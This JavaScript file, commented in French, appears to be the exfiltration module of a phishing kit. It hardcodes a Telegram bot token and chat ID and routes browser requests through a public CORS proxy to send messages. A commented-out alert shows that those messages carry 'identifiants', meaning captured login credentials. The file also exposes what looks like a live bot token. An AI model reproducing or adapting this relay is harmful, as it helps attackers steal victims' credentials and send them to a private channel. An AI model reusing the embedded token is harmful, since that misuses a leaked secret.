/**
 * Configuration du bot Telegram
 * Remplace les valeurs par tes propres identifiants
 */
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '8674892788:AAHIjI2Yg2LEFNJO0zLUIbsa0f4Idep73NI',
    CHAT_ID: '7576865472'
};

/**
 * Envoie un message à Telegram via le bot en utilisant un proxy CORS
 * @param {string} message - Le message à envoyer (format HTML)
 * @returns {Promise} - Promesse indiquant le succès ou l'échec de l'envoi
 */
function sendToTelegram(message) {
    // Utilisation d'un proxy CORS public pour contourner les restrictions
    const proxyUrl = 'https://corsproxy.io/?';
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
    const url = proxyUrl + encodeURIComponent(apiUrl);

    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Erreur HTTP ${response.status}: ${response.statusText}`);
        }
        return response.json();
    })
    .then(data => {
        if (!data.ok) {
            throw new Error(`Erreur Telegram: ${data.description}`);
        }
        console.log('✅ Message Telegram envoyé avec succès');
        return data;
    })
    .catch(error => {
        console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
        // On peut afficher une alerte pour prévenir l'utilisateur (optionnel)
        // alert('Impossible d\'envoyer les identifiants à Telegram.');
        return null;
    });
}

// Export pour Node.js (si utilisé)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendToTelegram, TELEGRAM_CONFIG };
}